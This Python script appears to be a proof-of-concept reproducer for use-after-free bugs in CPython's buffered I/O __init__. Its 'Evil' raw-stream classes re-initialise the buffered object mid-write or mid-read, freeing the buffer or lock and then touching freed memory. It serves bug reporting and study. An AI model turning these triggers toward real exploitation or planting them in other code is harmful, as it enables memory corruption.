"""Siblings of the _buffered_init re-entrancy UAF (bufferedio.c:847 / :854).

Three distinct victims of the same root cause -- __init__ is not one of the 12
ENTER_BUFFERED sites, so it can free self->buffer and self->lock from inside a
region that is holding both:

  writer  BufferedWriter.write -> _bufferedwriter_flush_unlocked (:2041)
          -> _bufferedwriter_raw_write (:1984) hands raw.write() a memoryview
          over self->buffer + self->write_pos.  UAF READ.

  lock    _buffered_init:854 PyThread_free_lock(self->lock) frees the lock the
          outer ENTER_BUFFERED region acquired; LEAVE_BUFFERED (:334) then
          releases the *new* lock, which nobody ever acquired.  The buffer is
          never touched, so this isolates the lock half.

  random  BufferedRandom.__init__ (bufferedio.c:2509) is the third
          _buffered_init caller and inherits both.

Usage: <python> bufferedio_reinit_siblings.py {writer|lock|random}
"""
import sys

MODE = sys.argv[1] if len(sys.argv) > 1 else "writer"

import io

BIG = 1 << 20
SMALL = 64


class Sink(io.RawIOBase):
    def readable(self):
        return True

    def writable(self):
        return True

    def seekable(self):
        return True

    def readinto(self, b):
        return 0

    def write(self, b):
        return len(b)


class EvilWriter(io.RawIOBase):
    def writable(self):
        return True

    def seekable(self):
        return True

    def write(self, b):
        n = len(b)
        print("  in raw.write, view len =", n)
        sys.stdout.flush()
        bw.__init__(Sink(), buffer_size=SMALL)   # frees the block `b` views
        print("  re-init done")
        sys.stdout.flush()
        data = bytes(b)                           # UAF READ of the whole view
        return n


class EvilLock(io.RawIOBase):
    def readable(self):
        return True

    def readinto(self, b):
        print("  in readinto; freeing the held lock via __init__")
        sys.stdout.flush()
        br.__init__(Sink(), buffer_size=BIG)      # PyThread_free_lock(held lock)
        print("  re-init done, returning without touching the view")
        sys.stdout.flush()
        return 0                                  # never write -> buffer half unused


class EvilRandom(io.RawIOBase):
    def readable(self):
        return True

    def writable(self):
        return True

    def seekable(self):
        return True

    def seek(self, pos, whence=0):
        return 0

    def tell(self):
        return 0

    def readinto(self, b):
        n = len(b)
        print("  in readinto, view len =", n)
        sys.stdout.flush()
        brw.__init__(Sink(), buffer_size=SMALL)
        b[0:n] = b"Y" * n
        return n


if MODE == "writer":
    bw = io.BufferedWriter(EvilWriter(), buffer_size=BIG)
    bw.write(b"Z" * (BIG - 1))
    print("buffered; forcing flush")
    sys.stdout.flush()
    bw.flush()
    print("survived")
elif MODE == "lock":
    br = io.BufferedReader(EvilLock(), buffer_size=BIG)
    print("peek ->", len(br.peek()))
    print("second peek ->", len(br.peek()))
    print("close ->", br.close())
    print("survived")
elif MODE == "random":
    brw = io.BufferedRandom(EvilRandom(), buffer_size=BIG)
    print("peek ->", len(brw.peek()))
    print("survived")
else:
    raise SystemExit("unknown mode " + MODE)
